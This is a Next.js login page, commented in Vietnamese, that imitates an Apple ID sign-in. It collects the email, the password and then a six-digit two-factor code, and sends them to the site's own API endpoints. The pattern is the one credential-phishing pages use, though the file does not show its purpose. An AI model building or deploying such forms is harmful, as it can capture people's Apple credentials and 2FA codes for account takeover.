import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';

export default function AuthPage() {
  const [step, setStep] = useState<'login' | 'verify'>('login');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [dsid, setDsid] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [verifyInfo, setVerifyInfo] = useState({ message: '', type: '' });
  const router = useRouter();

  useEffect(() => {
    // Reset lỗi khi chuyển step
    setError('');
  }, [step]);

  const handleLogin = async () => {
  setIsLoading(true);
  setError('');
  try {
    const response = await fetch('/api/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password }),
    });

    const data = await response.json();
    console.log('Full login response:', data);

    // Xử lý theo logic mới
    if (data.success && !data.requires2FA) {
      // Đăng nhập thành công không cần 2FA
      router.push('/');
    } else if (data.requires2FA) {
      // Yêu cầu 2FA
      setDsid(data.dsid);
      setVerifyInfo({
        message: data.message || 'Vui lòng nhập mã xác minh 6 số',
        type: data.authType || 'sms'
      });
      setStep('verify');
    } else {
      // Lỗi đăng nhập
      setError(data.error || 'Đăng nhập thất bại');
    }
  } catch (err) {
    setError('Lỗi kết nối máy chủ');
  } finally {
    setIsLoading(false);
  }
};

  const handleVerify = async () => {
    setIsLoading(true);
    setError('');
    try {
      const response = await fetch('/api/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password, code, dsid }),
      });

      const data = await response.json();
      if (data.success) {
        router.push('/');
      } else {
        setError(data.error || 'Xác thực thất bại. Vui lòng thử lại.');
        // Tự động quay lại form login nếu lỗi nặng
        if (data.error?.includes('session')) {
          setStep('login');
        }
      }
    } catch (err) {
      setError('Lỗi kết nối máy chủ');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 p-4">
      <div className="w-full max-w-md bg-white rounded-lg shadow-md overflow-hidden transition-all">
        {/* Login Form */}
        {step === 'login' && (
          <div className="p-6 space-y-4">
            <h1 className="text-2xl font-bold text-center">Đăng nhập Apple ID</h1>
            
            {error && <div className="p-3 bg-red-100 text-red-700 rounded">{error}</div>}

            <div>
              <input
                type="email"
                className="w-full p-3 border rounded"
                placeholder="Apple ID"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                disabled={isLoading}
              />
            </div>

            <div>
              <input
                type="password"
                className="w-full p-3 border rounded"
                placeholder="Mật khẩu"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                disabled={isLoading}
              />
            </div>

            <button
              onClick={handleLogin}
              disabled={isLoading}
              className={`w-full p-3 rounded text-white ${
                isLoading ? 'bg-blue-400' : 'bg-blue-600 hover:bg-blue-700'
              }`}
            >
              {isLoading ? 'Đang đăng nhập...' : 'Tiếp tục'}
            </button>
          </div>
        )}

        {/* 2FA Form - Luôn hiển thị nếu step === 'verify' */}
        {step === 'verify' && (
          <div className="p-6 space-y-4">
            <h1 className="text-2xl font-bold text-center">Xác thực 2 yếu tố</h1>
            
            {error && <div className="p-3 bg-red-100 text-red-700 rounded">{error}</div>}

            <div className="p-4 bg-blue-50 border-l-4 border-blue-500 rounded">
              <p>{verifyInfo.message || 'Vui lòng nhập mã xác minh 6 số'}</p>
            </div>

            <div>
              <input
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={6}
                className="w-full p-3 border rounded text-center text-xl tracking-widest"
                placeholder="Mã 6 số"
                value={code}
                onChange={(e) => setCode(e.target.value.replace(/\D/g, ''))}
                disabled={isLoading}
              />
            </div>

            <button
              onClick={handleVerify}
              disabled={isLoading || code.length !== 6}
              className={`w-full p-3 rounded text-white ${
                isLoading ? 'bg-green-400' : 'bg-green-600 hover:bg-green-700'
              }`}
            >
              {isLoading ? 'Đang xác minh...' : 'Xác nhận'}
            </button>

            <button
              onClick={() => setStep('login')}
              className="w-full p-3 bg-gray-100 hover:bg-gray-200 rounded"
            >
              Quay lại
            </button>
          </div>
        )}
      </div>
    </div>
  );
}